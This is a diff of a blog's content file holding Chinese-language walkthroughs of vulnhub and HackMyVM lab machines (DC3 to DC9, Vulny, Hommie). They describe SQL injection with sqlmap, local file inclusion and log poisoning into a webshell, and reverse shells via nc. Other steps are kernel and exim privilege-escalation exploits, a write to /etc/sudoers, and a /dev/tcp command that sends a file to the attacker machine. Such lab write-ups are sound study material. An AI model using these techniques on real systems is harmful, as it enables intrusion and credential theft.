+<h3 id="2用joomla漏洞-非爆破"><a href="#2用joomla漏洞-非爆破" class="headerlink" title="2用joomla漏洞 (非爆破)"></a>2用joomla漏洞 (非爆破)</h3><p>用searchsploit 搜索joomla + 版本号<br>这个脚本告诉我们了sqlmap使用的sqlmap<br><img src="https://pic1.imgdb.cn/item/679a2415d0e0a243d4f876a2.png"><br>到columns这里要注意一点 这里用自动就什么都没有  而且因为这个表名有# 有用引号括起来<br><img src="https://pic1.imgdb.cn/item/679a2415d0e0a243d4f876a3.png" alt="|500"><br>同样可以得到这个密码</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>可以做一些常规的操作比如suid  系统漏洞等  suid没有可以利用的 但是系统比较老 可以用内核提权<br>.linux系统漏洞提权<br>先在webshell里面用<code>cat /etc/*releas</code> 得到当前ubuntu系统的版本号  DISTRIB_RELEASE&#x3D;16.04<br><code>uname -a</code> 查看内核版本   Linux DC-3 4.4.0-21-generic<br>然后用searchsploit 找到漏洞利用脚本（必须同时满足系统和内核版本）  这里给的网址已经失效 需要我们去仓库 找到新的地方<br>把下载下来的文件用scp复制到kali 的&#x2F;var&#x2F;www&#x2F;html中  然后在webshell用wget下载这个利用脚本<br>解压之后 运行脚本就可以提权了<br><img src="https://pic1.imgdb.cn/item/679a23e6d0e0a243d4f8769f.png" alt="|475"></p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DC7靶场复盘</title>
+    <url>/posts/51728.html</url>
+    <content><![CDATA[<p>vulnhub-DC7靶场复盘</p>
+<span id="more"></span>
+<p>最难的是最开始的信息收集 ！！！ 根据网站提示的到外部找信息 一下下面的D7user 去github找到<mark>敏感信息泄漏</mark></p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://pic1.imgdb.cn/item/679a17c7d0e0a243d4f87577.png" alt="|250"><br><img src="https://pic1.imgdb.cn/item/679a17c8d0e0a243d4f87578.png" alt="|400"><br>nmap -A扫描之后发现80端口下面的目录结构 并且看到http是用Drupal 这个软件支持的 （后面回用到</p>
+<h2 id="web-探测-信息收集"><a href="#web-探测-信息收集" class="headerlink" title="web 探测 + 信息收集"></a>web 探测 + 信息收集</h2><p>用dirsearch跑一下目录 也没有发现什么有用的网页<br>页面上有一个搜索框 用sqlmap尝试发现没有注入点<br><img src="https://pic1.imgdb.cn/item/679a17c8d0e0a243d4f87579.png"><br>网站首页提示了用目录爆破不会成功 去外面找信息 –&gt; github<br><img src="https://pic1.imgdb.cn/item/679a17c9d0e0a243d4f8757a.png" alt="|425"><br>在github成功找到了这个用户<br><img src="https://pic1.imgdb.cn/item/679a17c9d0e0a243d4f8757b.png" alt="|450"><br>在config.php 中找到了用户名和密码 尝试在网站登录  失败  我们就登录ssh  拿到shell</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://pic1.imgdb.cn/item/679a1814d0e0a243d4f8758a.png" alt="|575"><br>发现有一个叫做mbox的文件 里面是root发送的 并且好像每十五分钟发送一次<br>看一下这里的sh里有什么内容</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">dc7user@dc-7:~$ <span class="built_in">cat</span> /opt/scripts/backups.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">rm</span> /home/dc7user/backups/*</span><br><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line">drush sql-dump --result-file=/home/dc7user/backups/website.sql</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">tar -czf /home/dc7user/backups/website.tar.gz html/</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz</span><br><span class="line"><span class="built_in">chown</span> dc7user:dc7user /home/dc7user/backups/*</span><br><span class="line"><span class="built_in">rm</span> /home/dc7user/backups/website.sql</span><br><span class="line"><span class="built_in">rm</span> /home/dc7user/backups/website.tar.gz</span><br><span class="line">You have new mail <span class="keyword">in</span> /var/mail/dc7user</span><br></pre></td></tr></table></figure></div>
+<p>这里看到有用到drush这个服务<br><img src="https://pic1.imgdb.cn/item/679a1815d0e0a243d4f8758e.png"><br>而且可以看到这个文件的属主是root  只有www-data这个用户可以写入 我们只有一个读权限<br>现在我们的目标就是把root的shell用nc -e 反弹到本机  就是把这个语句写到这个脚本里面让他执行<br>现在的目的就是如何拿到www-data的shell   <mark>用drush</mark><br>根据搜索的知识 drush一般要在站点所在的目录下操作<br><code>cd /var/www/html     drush user-information admin </code><br> 可以查到管理的信息<br>然后再修改管理的密码 登录到web里面<br><img src="https://pic1.imgdb.cn/item/679a1816d0e0a243d4f87590.png" alt="|475"><br>但是发现这里和上一个靶机不一样 没有php的选项    搜索资料知道可以去下载插件<br>在网页上用php代码 写上反弹shell<br>现在就是用这个www用户把反弹shell语句写到刚才的那个脚本中  然后等到十五分的时候自动执行<br>完成！！ </p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>DC9靶场复盘</title>
     <url>/posts/14257.html</url>
     <content><![CDATA[<p>vulnhub-DC9靶场复盘</p>
@@ -1462,6 +1496,24 @@
 <h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p>发现有一个登录界面 用户名是admin 用bp爆破无法得到正确的密码<br>并且search有一个输入框<br><img src="https://s3.bmp.ovh/imgs/2025/01/29/f81f33ccbd3d01ca.png" alt="|425"><img src="https://s3.bmp.ovh/imgs/2025/01/29/7a426990d44cebb4.png" alt="|475"><br>这个搜索框是一个post请求  在这里可以使用sqlmap进行sql注入<br>在这里我们使用-u 和 –data “search&#x3D;1” 这里是post类型注入 自动画操作再加上–batch<br>查询之后 在上一条指令后面加上–dbs就可以查到数据库<br><img src="https://s3.bmp.ovh/imgs/2025/01/29/f9bc162ab156b944.png" alt="|525"><br>一步一步扫描 刚才是数据库 现在就是指定数据库 查表 后面就是查列<br>-D users –tables  - T *** –columns<br><img src="https://s3.bmp.ovh/imgs/2025/01/29/158b8293575e9909.png" alt="|400"><br>现在要查询用户名和密码字段 用-C “username,password” –dump<br><img src="https://s3.bmp.ovh/imgs/2025/01/29/340563e3e3b4f104.png" alt="|350"><br>找到一系列用户名和密码<br>然后我们定位到csv文件里 用awk 做一个分割  分别存进user.txt pass.txt<br>现在这里没有类似admin之类的用户 我们现在去另外一个数据库里继续查询<br>然后可以发现一个admin用户  将md5放在网站中破解<br>得到密码之后 可以登录网站的manager界面 在添加记录这里尝试添加’ # 看看有没有报错<br>发现在邮箱这边确实会出现报错<br><img src="https://pic1.imgdb.cn/item/6799dc7dd0e0a243d4f870b1.png"><br> 同时还可以看到不存在 –&gt; 文件包含漏洞<br> <img src="https://pic1.imgdb.cn/item/6799dc7dd0e0a243d4f870b2.png"><br> <mark>下一步就要用web登录到服务器</mark><br> 我们在url这里输入?file&#x3D; ..&#x2F;..&#x2F;etc&#x2F;passwd 一直尝试相对路径<br> 接着用bp来获取他的真实路径   在bp浏览器中登录管理员账户<br> <img src="https://pic1.imgdb.cn/item/6799dc7dd0e0a243d4f870b3.png"><br> 在bp包中把file&#x3D;后面加上$  然后在payload里面加上相对路径<br> <img src="https://pic1.imgdb.cn/item/6799dc7ed0e0a243d4f870b4.png" alt="|500"><br> 根据返回的长度就可以得到真实路径<br> <img src="https://pic1.imgdb.cn/item/6799dc7ed0e0a243d4f870b5.png" alt="|500"><br> 然后我们到真实的路径下面 因为知道有ssh服务 所以可以查看ssh配置文件  发现不允许root登录 listen也没有配置<br> 因为之前我们知道22端口被防火墙过滤了 我们猜测有knockd服务 在&#x2F;proc&#x2F;sched_debug 里面可以看到所以配置的服务<br> <img src="https://pic1.imgdb.cn/item/6799dce1d0e0a243d4f870ba.png" alt="|475"><br> 把这些信息都放到kali a.txt 用正则表达式过滤 cat a.txt | egrep ‘[a-zA-z]+’ 这样子可以搜索服务 -o输出匹配内容 在sort排序 （还可以uniq去重） 发现有knockd这个服务<br> 然后访问etc&#x2F;knockd.conf<br> <img src="https://pic1.imgdb.cn/item/6799dce1d0e0a243d4f870bb.png"><br> 可以看到knock服务的访问顺序是 9842 8475 7469   然后用nc或者kali自带的knock(注意没有d来访问<br> 然后我们就发现这个22端口现在已经开放了<br> 现在用刚才的user 和 pass文件  用hydra爆破<br> hydra -L user.txt -P pass.txt ssh:&#x2F;&#x2F;192.168.240.171</p>
 <h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>然后拿到一些普通用户 我们进去看看有什么文件<br><img src="https://pic1.imgdb.cn/item/6799ddc3d0e0a243d4f870cc.png" alt="|475"><br>登录之后没有发现什么任何文件<br><img src="https://pic1.imgdb.cn/item/6799ddc3d0e0a243d4f870cd.png" alt="|450"><br>我们要输入<mark>sudo -l</mark> 查看是否有什么文件夹有root权限 发现这个用户什么都没有<br>登录到最后一个账户里面发现有一个新的文件 里面有新的密码<br><img src="https://pic1.imgdb.cn/item/6799dce5d0e0a243d4f870bd.png" alt="|475"><br>把这些密码放到pass.txt 中 再用hydra 跑一遍<br>登入到新的用户<br>输入root -l 之后发现有一个root组的文件<br><img src="https://pic1.imgdb.cn/item/6799dce4d0e0a243d4f870bc.png" alt="|525"><br><img src="https://pic1.imgdb.cn/item/6799dce6d0e0a243d4f870be.png" alt="|375"><br>这个脚本接受两个参数 读第一个文件的内容 然后添加到第二个文件里<br>我们现在就加到etc&#x2F;sudoers 添加权限   现在就新建一个文件夹 然后添加root的权限(ALL&#x3D;(ALL:ALL) ALL)<br>这里我们要在主文件夹下面写这个文件  因为刚才test脚本在的地方是有root权限的<br>然后用刚才的脚本把a.txt 写入 etc&#x2F;sudoers<br>输入sudo su -<br><img src="https://pic1.imgdb.cn/item/6799dd8bd0e0a243d4f870c9.png" alt="|400"><br>解决！！</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="EBNF"><figure class="iseeu highlight /ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">codeblock</span></span><br></pre></td></tr></table></figure></div>]]></content>
+      <categories>
+        <category>靶场</category>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DC8靶场复盘</title>
+    <url>/posts/51727.html</url>
+    <content><![CDATA[<p>vulnhub-DC8靶场复盘</p>
+<span id="more"></span>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>这个主要考察从web端进入</p>
+<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p>0.用dirsearch找到网页所有的目录  知道有mysql服务 暗示要sql注入  而且有robots.txt 其中有user&#x2F;login目录<br>1.在网页点击其他链接的时候看到url有参数 尝试注释闭合<br>发现有sql注入点<br><img src="https://pic1.imgdb.cn/item/679a1620d0e0a243d4f87546.png" alt="|550"><br>2.用sqlmap得到管理员账号<br><img src="https://pic1.imgdb.cn/item/679a1620d0e0a243d4f87547.png" alt="|500"><br>最终找到两条记录 然后将这个hash放到一个目录用john 去跑 可以找到john的密码<br>3.登录网站管理员的账号<br>有一个edit选项 里面可以上传文件 但是无法上传php文件<br><img src="https://pic1.imgdb.cn/item/679a1621d0e0a243d4f87548.png" alt="|500"><br>在contactus webform 发现可以修改用户上传之后的提示回显  并且可以用PHP代码 实验之后发现确实可以渲染php<br>现在可以用system指令来反弹shell<br><img src="https://pic1.imgdb.cn/item/679a1621d0e0a243d4f87549.png" alt="|525"><br><img src="https://pic1.imgdb.cn/item/679a1622d0e0a243d4f8754a.png"><br>这个指令可以在反弹的shell里面加上前缀 可以美化输出<br>随便看看这个用户目录下的文件 </p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null  意思从根目录开始找 所有者是root 只包括suid 的 然后将标准错误不输出<br><img src="https://pic1.imgdb.cn/item/679a1666d0e0a243d4f8754f.png" alt="|500"><br>这里利用exim提权（先查看这里exim4的版本  用searchsploit exim发现漏洞<br>然后把文件复制到&#x2F;var&#x2F;www&#x2F;html 下方便传输到受害机<br><img src="https://pic1.imgdb.cn/item/679a1669d0e0a243d4f87550.png" alt="|425"><br>在受害机上面用wget接受这个脚本<br><img src="https://pic1.imgdb.cn/item/679a166ad0e0a243d4f87551.png"><br><img src="https://pic1.imgdb.cn/item/679a166bd0e0a243d4f87552.png"><br>有两种方法使用这个脚本 选择第二种 因为 第二种在脚本说可以有一个shell<br>但是如果我们用 cat -A 查看这个a.sh 文件发现 末尾都是^M<br>用dos2unix转换之后 可以运行   bash a.sh -m netcat<br><img src="https://pic1.imgdb.cn/item/679a166cd0e0a243d4f87553.png" alt="|450"><br>发现成功提权 然后到&#x2F;root目录下 就解决！！ </p>
+]]></content>
       <categories>
         <category>靶场</category>
         <category>vulnhub</category>
@@ -1516,22 +1568,6 @@
       </tags>
   </entry>
   <entry>
-    <title>HMV-Vulny</title>
-    <url>/posts/19932.html</url>
-    <content><![CDATA[<p>HMV-Vulny靶场复盘</p>
-<span id="more"></span>
-
-<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1>]]></content>
-      <categories>
-        <category>靶场</category>
-        <category>hmv</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-        <tag>HMV</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HMV-Baseme</title>
     <url>/posts/46022.html</url>
     <content><![CDATA[<p>HMV-Baseme靶场复盘</p>
@@ -1559,32 +1595,49 @@
       </tags>
   </entry>
   <entry>
-    <title>DC5靶场复盘</title>
-    <url>/posts/19078.html</url>
-    <content><![CDATA[<p>vulnhub-DC5靶场复盘</p>
+    <title>HMV-Vulny</title>
+    <url>/posts/19932.html</url>
+    <content><![CDATA[<p>HMV-Vulny靶场复盘</p>
 <span id="more"></span>
-<h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><p>这题的靶场提示要在web找到刷新改变的东西<br><img src="https://pic1.imgdb.cn/item/679a1f6ed0e0a243d4f87639.png"><br>这个靶机只有一个80端口 没有22ssh端口<br>而且这个网站没有用cms  是一个静态的页面</p>
-<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p>在contact us 里有输入框 用sqlmap 扫描之后没有注入点<br>在contact us 输入内容返回的thank you.php 界面刷新 发现下面的footer会刷新 查看页面源代码<br><img src="https://pic1.imgdb.cn/item/679a1f6fd0e0a243d4f8763a.png" alt="|450"><br>这个界面是有一个footer.php的 所以这里有一个文件包含漏洞  因为是其他有调用这个footer.php<br>但是现在不知道用什么关键字访问到包含文件  所以我们用wfuzz跑关键字<br><img src="https://pic1.imgdb.cn/item/679a1f6fd0e0a243d4f8763b.png" alt="|575"><br><img src="https://pic1.imgdb.cn/item/679a1f70d0e0a243d4f8763c.png"><br>找到了关键字是file  现在就可以访问服务器中的文件了   <strong>现在的又一个难题是只能看到文件如何才能拿到shell呢</strong><br>我们知道如果可以写入一个一句话木马就可以拿到shell   但是应该用什么方式实现呢？<br>用apache2服务访问的日志 错误日志也会存 存在&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log 中  这里没有我们就用nginx<br>下一步就是用bp修改<br><img src="https://pic1.imgdb.cn/item/679a1f70d0e0a243d4f8763c.png" alt="|425"><br>这一条记录会在access.log中<br><img src="https://pic1.imgdb.cn/item/679a1f98d0e0a243d4f8763e.png"><br>我们的标记存在 而且后面的php代码没有显示出来 说明被成功解析了  用蚁剑连接shell</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在上一步拿到蚁剑的shell之后反弹到本机中<br>提权思路还是找到存在漏洞的服务<br><img src="https://pic1.imgdb.cn/item/679a1f98d0e0a243d4f8763f.png" alt="|450"><br>这里有一个screen服务而且告诉了版本号 大概率就是利用这个<br>然后用wget 从靶机下载本机的这个脚本  <mark>注意这个脚本不能再www目录下运行  在其他目录下wget</mark><br>运行之后拿到root权限 解决！！！ </p>
-]]></content>
-      <categories>
-        <category>靶场</category>
-        <category>vulnhub</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-        <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HMV-Hommie</title>
-    <url>/posts/61994.html</url>
-    <content><![CDATA[<p>HMV-Hommie靶场复盘</p>
-<span id="more"></span>
-<p><img src="https://pic1.imgdb.cn/item/679a35f8d0e0a243d4f878cf.png"></p>
-<h1 id="Hommie"><a href="#Hommie" class="headerlink" title="Hommie"></a>Hommie</h1><h2 id="端口扫描-信息收集"><a href="#端口扫描-信息收集" class="headerlink" title="端口扫描&#x2F;信息收集"></a>端口扫描&#x2F;信息收集</h2><p><img src="https://pic1.imgdb.cn/item/679a3ec2d0e0a243d4f87a20.png" alt="|700"><br>发现有三个端口  ftp ssh http<br>先看看ftp能不能匿名登录<br><img src="https://pic1.imgdb.cn/item/679a3ec6d0e0a243d4f87a21.png" alt="|550"><br>尝试把反弹shell文件上传  无法得到shell<br>80端口<br><img src="https://pic1.imgdb.cn/item/679a3ec8d0e0a243d4f87a22.png"><br>得到两个用户 alexia nobody   并且提示我们要得到alexia的id_rsa<br>目录扫描<br><img src="https://pic1.imgdb.cn/item/679a3eccd0e0a243d4f87a23.png"><br><img src="https://pic1.imgdb.cn/item/679a3ed0d0e0a243d4f87a24.png"><br>使用了两个常用的目录字典都没有扫描到 说明大概率就是没有其他目录<br>web如果没有信息就说明信息收集还不过     – 重新用nmap扫描  看看有没有其他服务<br> <img src="https://pic1.imgdb.cn/item/679a3ef9d0e0a243d4f87a28.png"><br> 有新的发现  还有开放dhcpc tftp 服务<br> 根据前面的提示  get id_rsa  成功得到rsa私钥  登录到ssh<br> <img src="https://pic1.imgdb.cn/item/679a3f04d0e0a243d4f87a2d.png"><br> 成功拿到shell</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://pic1.imgdb.cn/item/679a3f07d0e0a243d4f87a2e.png"><br>没有sudo指令  查suid  不一样的就是的第一个<code>/opt/showMetheKey</code><br>执行这个文件之后 发现是一个rsa私钥<br><img src="https://pic1.imgdb.cn/item/679a3f0cd0e0a243d4f87a2f.png"><br>这个私钥是当前用户的  我们要想办法得到root用户的<br>现在将这个文件下载到本地 <code>cat showMetheKey &gt; /dev/tcp/192.168.240.83/1234</code><br><img src="https://pic1.imgdb.cn/item/679a3f0cd0e0a243d4f87a30.png"><br>用ida分析这个程序<br><img src="https://pic1.imgdb.cn/item/679a3f80d0e0a243d4f87a3a.png"></p>
-<p>所以修改环境变量 这样子就可以得到root的rsa私钥<br><img src="https://pic1.imgdb.cn/item/679a3f73d0e0a243d4f87a33.png"><br><img src="https://pic1.imgdb.cn/item/679a3f7ad0e0a243d4f87a38.png"><br>成功登录到root<br><img src="https://pic1.imgdb.cn/item/679a3f7fd0e0a243d4f87a39.png"></p>
+<p><img src="https://pic1.imgdb.cn/item/679ddc0dd0e0a243d4f97365.png"><br>这个靶机是一个ubuntu系统的靶机，前面获取不到靶机ip，修改了好长时间，不过也正好补充我的靶机配置博客<br>解决方案在： <a href="/posts/86.html" title="mac环境靶场搭建">mac环境靶场搭建</a></p>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.240.139  </span></span><br><span class="line"><span class="params">sh:</span> <span class="number">0</span>: getcwd() <span class="params">failed:</span> No such file <span class="keyword">or</span> directory</span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">01</span> <span class="number">16</span>:<span class="number">32</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">240.139</span> (<span class="number">192.168</span>.<span class="number">240.139</span>)</span><br><span class="line">Host is up (<span class="number">0.0026</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">999</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    Apache httpd <span class="number">2.4</span>.<span class="number">41</span> ((Ubuntu))</span><br><span class="line">|<span class="params">_http-title:</span> Apache2 Ubuntu Default <span class="params">Page:</span> It works</span><br><span class="line">|<span class="params">_http-server-header:</span> Apache<span class="symbol">/2.4.41</span> (Ubuntu)</span><br><span class="line">MAC <span class="params">Address:</span> B2:A7:<span class="number">1</span>A:<span class="number">3</span>F:<span class="number">30</span>:A9 (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose|router</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X, MikroTik RouterOS <span class="number">7</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span> cpe:<span class="operator">/</span>o:mikrotik:routeros:<span class="number">7</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5.6</span>.<span class="number">3</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> <span class="operator">-</span> <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.61</span> ms <span class="number">192.168</span>.<span class="number">240.139</span> (<span class="number">192.168</span>.<span class="number">240.139</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">8.33</span> seconds</span><br></pre></td></tr></table></figure></div>
+<p>显示只有一个80的web端口 我们下一步就去web找更多信息</p>
+<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p>web默认界面是ubuntu系统界面，没有多余信息<br>目录扫描：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># dirsearch -u 192.168.240.139</span></span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>python3<span class="operator">/</span>dist-packages<span class="operator">/</span>dirsearch<span class="operator">/</span>dirsearch.py:<span class="number">23</span>: <span class="params">DeprecationWarning:</span> pkg_resources is deprecated as an API. See https:<span class="symbol">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  from pkg_resources <span class="built_in">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_<span class="operator">||</span>| _) (<span class="operator">/</span>_(_<span class="operator">||</span> (_| )</span><br><span class="line"></span><br><span class="line"><span class="params">Extensions:</span> php, aspx, jsp, html, js | HTTP <span class="params">method:</span> GET | <span class="params">Threads:</span> <span class="number">25</span> | Wordlist <span class="params">size:</span> <span class="number">11460</span></span><br><span class="line"></span><br><span class="line">Output <span class="params">File:</span> <span class="symbol">/root/tmp/reports/_192.168.240.139/_25-02-01_16-36-17.txt</span></span><br><span class="line"></span><br><span class="line"><span class="params">Target:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.139</span><span class="symbol">/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="params">Starting:</span> </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.ht_wsr.txt</span>                                      </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.bak1</span>                                   </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.orig</span>                                   </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.sample</span>                                 </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_extra</span>                                  </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.save</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessBAK</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_orig</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD</span>                                     </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_sc</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD2</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htm</span>                                             </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.html</span>                                            </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.httr-oauth</span>                                      </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswds</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">18</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.php</span>                                             </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswd_test</span>                                   </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">24</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">323</span>B  <span class="operator">-</span> <span class="symbol">/javascript</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.139</span><span class="operator">/</span>javascript<span class="symbol">/</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">27</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">319</span>B  <span class="operator">-</span> <span class="symbol">/secret</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.139</span><span class="operator">/</span>secret<span class="symbol">/</span>       </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span 